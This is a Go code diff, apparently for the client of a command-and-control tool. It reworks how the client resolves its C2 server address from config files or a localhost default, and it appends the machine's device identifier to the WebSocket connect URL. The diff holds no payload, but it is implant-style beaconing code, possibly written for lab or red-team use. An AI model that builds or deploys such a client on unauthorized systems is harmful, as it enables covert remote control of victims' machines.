@@ -4,6 +4,7 @@ import (
 	"context"
 	"log/slog"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"strings"
@@ -16,8 +17,10 @@ import (
 )
 
 const (
-	DefaultServerURL = "ws://localhost:8080/ws/connect?id=win-vbox-01"
-	ConfigFileName   = "config.txt"
+	// DefaultServerBase is the fallback C2 base domain (no path / id). The
+	// client appends the connection route and its own device identity.
+	DefaultServerBase = "ws://localhost:8080"
+	ConfigFileName    = "config.txt"
 )
 
 func runMainApplication() {
@@ -59,25 +62,43 @@ func runMainApplication() {
 	}
 }
 
-func resolveServerURL() string {
-	// A runtime config.txt beside the executable takes precedence (override),
-	// otherwise fall back to the configuration bundled inside the binary.
+// resolveServerBase returns the C2 base domain. config.txt is expected to
+// contain ONLY the base (e.g. "https://example.com"); a runtime override file
+// beside the executable takes precedence, otherwise the bundled config, and
+// finally the hardcoded default base.
+func resolveServerBase() string {
 	if data, err := os.ReadFile(ConfigFileName); err == nil {
-		if urlStr := strings.TrimSpace(string(data)); urlStr != "" {
-			slog.Info("using server URL from local override configuration file")
-			return urlStr
+		if base := strings.TrimSpace(string(data)); base != "" {
+			slog.Info("using base domain from local override configuration file")
+			return base
 		}
 		slog.Warn("local configuration file empty, falling back to bundled config")
 	} else {
 		slog.Debug("no local configuration file present, using bundled configuration", "err", err)
 	}
 
-	urlStr := strings.TrimSpace(string(embeddedConfig))
-	if urlStr == "" {
-		slog.Warn("bundled configuration empty, reverting to defaults")
-		return DefaultServerURL
+	base := strings.TrimSpace(string(embeddedConfig))
+	if base == "" {
+		slog.Warn("bundled configuration empty, reverting to default base")
+		return DefaultServerBase
 	}
-	return urlStr
+	return base
+}
+
+// resolveServerURL assembles the full WebSocket endpoint by appending the
+// connection route and the client's own device identity to the base domain.
+func resolveServerURL() string {
+	base := strings.TrimRight(resolveServerBase(), "/")
+
+	// Tolerate legacy config entries that already embed the full path.
+	if strings.Contains(base, "/ws/connect") {
+		return base
+	}
+
+	deviceID := systemIdentifier()
+	full := base + "/ws/connect?id=" + url.QueryEscape(deviceID)
+	slog.Info("resolved upstream endpoint", "device_id", deviceID, "url", full)
+	return full
 }
 
 // establishControlLine dials the upstream and processes tasks until the
